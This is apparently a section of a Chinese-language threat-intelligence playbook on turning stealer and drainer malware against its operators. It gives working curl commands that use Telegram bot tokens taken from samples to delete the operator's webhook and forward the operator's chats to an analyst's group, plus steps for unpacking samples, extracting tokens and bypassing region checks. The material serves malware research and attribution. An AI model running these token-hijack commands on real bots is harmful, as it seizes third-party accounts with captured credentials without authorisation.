## D 面：恶意生态情报利用（C2/Stealer/Drainer）

### 拦截 exfil 标准方法论（ANY.RUN 公开技术）

```bash
# ① 从沙箱/代理抓样本请求 → 拿 token + chat_id
# ② 查看当前 webhook
curl -s "https://api.telegram.org/bot${TOKEN}/getWebhookInfo"

# ③ 如有 webhook → 保存配置 → 删除（避免真实接收端抢先消费）
curl -s "https://api.telegram.org/bot${TOKEN}/deleteWebhook"

# ④ 建 TG 群 + 把自己设匿名 → 把 bot 拉进群
# ⑤ 重置 update offset
curl -s "https://api.telegram.org/bot${TOKEN}/getUpdates?offset=-1"

# ⑥ 清空历史，此后新消息只发到我们群
LAST_ID=$(curl -s "https://api.telegram.org/bot${TOKEN}/getUpdates?offset=-1" | python3 -c "import sys,json; r=json.load(sys.stdin); print(r['result'][-1]['update_id']+1 if r['result'] else 0)")
curl -s "https://api.telegram.org/bot${TOKEN}/getUpdates?offset=${LAST_ID}"

# ⑦ 批量前转运营者消息到我们群
curl -s -X POST "https://api.telegram.org/bot${TOKEN}/forwardMessages" \
  -H "Content-Type: application/json" \
  -d "{\"chat_id\":\"${MY_GROUP}\",\"from_chat_id\":\"${VICTIM_CHAT}\",\"message_ids\":[1,2,3,4,5]}"
# ≤100 条/次，分钟级可稳定 2000+ 条

# ⑧ 完事恢复 webhook（如原配置存在）
```

**情报价值**：`getMe`/`getMyDescription`/`getWebhookInfo`/群成员与聊天历史 → 反查运营者身份、家族归属、webhook 基础设施（IOC pivot：webhook.site / *.pipedream.net / *.trycloudflare.com 等中继特征）。

### Drainer 家族逆向要点（JS 层）

- token + chat_id + 运营者钱包地址直接写在 JS 头部变量
- 区域检查（ipapi.co / cloudflare trace）过滤 CIS → 反向绕过需伪装 IP + navigator.language
- 混淆对抗：先搜 `api.telegram.org`、`bot`、`chat_id` 字符串锚点 → 沿调用回推
- 用 de4js / 自写 AST 反混淆 + 运行时 hook console/WebSocket

### Stealer/RAT 逆向链

```bash
# PyInstaller 解包
python3 pyinstxtractor.py target.exe
# 反编译
uncompyle6 extracted/telegrambt.pyc > telegrambt.py
# 提取 token
grep -oE '[0-9]{10}:[A-Za-z0-9_-]{35}' telegrambt.py

# 验证并采集情报
curl -s "https://api.telegram.org/bot${TOKEN}/getMe"
curl -s "https://api.telegram.org/bot${TOKEN}/getMyDescription"
```

### 聚类方法

同 token / 同 webhook URL / 同 bot description → 同一运营者。VirusTotal contacted URL 直接含 token 原文可批量聚类。

---

